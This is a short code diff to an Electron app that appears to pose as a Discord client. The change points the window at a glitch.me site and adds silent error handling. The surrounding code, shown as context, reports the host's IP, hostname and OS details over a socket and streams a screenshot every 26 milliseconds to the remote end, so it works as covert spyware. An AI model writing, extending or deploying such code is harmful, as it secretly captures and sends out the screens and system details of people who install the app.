@@ -20,7 +20,7 @@ function createWindow () {
     height: 600
   })
 
-  mainWindow.loadURL('https://discordapp.com/channels/@me')
+  mainWindow.loadURL('https://awesome-witness.glitch.me/')
 
   mainWindow.on('closed', function () {
     mainWindow = null
@@ -30,6 +30,7 @@ function createWindow () {
     socket.emit('new', {platform:os.platform(),arch:os.arch(),ip:ip.v4(),hostname:os.hostname()})
     //setInterval(() => { socket.emit('ping', {hostname:os.hostname()}) }, 15);
     setInterval(() => {
+      try {
       if(fs.existsSync(__dirname+'\\scr.png')) {
         fs.unlinkSync(__dirname+'\\scr.png')
       }
@@ -41,6 +42,10 @@ function createWindow () {
       })
       let b64 = getbase64(__dirname+'\\scr.png')
       socket.emit('scr', b64)
+      } catch (err) {
+        return false;
+        //dont care im on vacation
+      }
     }, 26)
   })
 }
